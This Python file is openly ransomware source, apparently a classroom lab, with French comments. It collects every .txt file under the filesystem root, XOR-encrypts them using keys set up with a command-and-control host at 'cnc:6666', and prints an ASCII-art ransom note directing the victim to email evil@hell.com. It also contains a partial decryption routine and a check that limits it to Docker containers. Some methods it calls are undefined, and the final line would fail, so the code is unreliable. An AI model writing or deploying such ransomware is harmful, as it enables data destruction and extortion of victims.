import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter: str) -> list: # Retourne tous les fichiers correspondant au filtre avec leurs chemins absolus
        
        base_path = Path('/')  # C'est la racine du Docker
        files = []  # Liste pour stocker les chemins des fichiers trouvés

        # Récupérer tous les fichiers avec le filtre
        for file in base_path.rglob(filter):
            # Ajouter le chemin absolu du fichier à la liste
            files.append(str(file.resolve()))  

        return files  


    def encrypt(self):
       
        fichiers = self.get_files("*.txt")# Récupération des fichiers texte (.txt) dans le système
        if not fichiers:
            print("Aucun fichier texte trouvé pour le chiffrement.")
            return
  
        gestionnaire_secrets = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        gestionnaire_secrets.setup()  

        #chiffrement de chaque fichier texte
        for chemin_fichier in fichiers:
            try:
                gestionnaire_secrets.xorfiles([chemin_fichier])
                print(f"Fichier chiffré avec succès : {chemin_fichier}")
            except Exception as e:
                print(f"Erreur lors du chiffrement de {chemin_fichier} : {e}")

        # Message à la victime
        token_hex = gestionnaire_secrets.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=token_hex))

    def recover_files(self) -> None:
        
        # Chargement les éléments cryptographiques 
        self.load()

        # Chargement de la liste des fichiers chiffrés 
        encrypted_files = self.load_encrypted_files()

        while True:
            try:
                # Demander à l'utilisateur d'entrer sa clé en base64
                b64_key = input("Veuillez entrer votre clé (au format base64) : ")
                
                # Valider la clé en appelant set_key
                self.set_key(b64_key)
                
                # Déchiffrer les fichiers en appelant xorfiles
                self.xorfiles(encrypted_files)
                
                # Nettoyer les éléments cryptographiques locaux avec clean
                self.clean()
                
                # Informer l'utilisateur que l'opération a été un succès
                print("Bravo ! Tous vos fichiers ont été déchiffrés avec succès.")
                break  
                
            except ValueError as e:
                # En cas d'erreur, afficher un message indiquant que la clé est incorrecte
                print(f"Erreur : {str(e)}. Veuillez réessayer.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()

print(Ransomware.get_files("txt"))